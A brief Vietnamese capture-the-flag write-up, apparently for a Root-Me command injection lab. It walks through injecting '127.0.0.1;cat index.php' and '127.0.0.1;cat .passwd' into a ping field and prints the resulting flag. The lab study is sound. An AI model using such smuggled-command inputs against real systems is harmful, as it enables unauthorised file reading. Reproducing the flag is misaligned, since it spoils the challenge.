![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/6aa3d53a-89e5-4a79-8ac4-66b6d1637e9f)

Sử dụng Burp Suite bắt request này và ta thấy được source code

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/9d834414-de88-4a8c-891f-d6ae9aced636)

=> đầu vào input là dạng text và kết quả trả về được hiển thị trong page-source 

Đọc tệp index.php với input ```127.0.0.1;cat index.php```

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/a26aa0f7-2bdc-4b6c-aa57-cda548da652f)

=> Flag ở trong file .passwd

Dùng lệnh ```127.0.0.1;cat .passwd```

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/36f9ddf2-e2fd-4c0f-aff1-62c847a12c71)

=> flag: S3rv1ceP1n9Sup3rS3cure
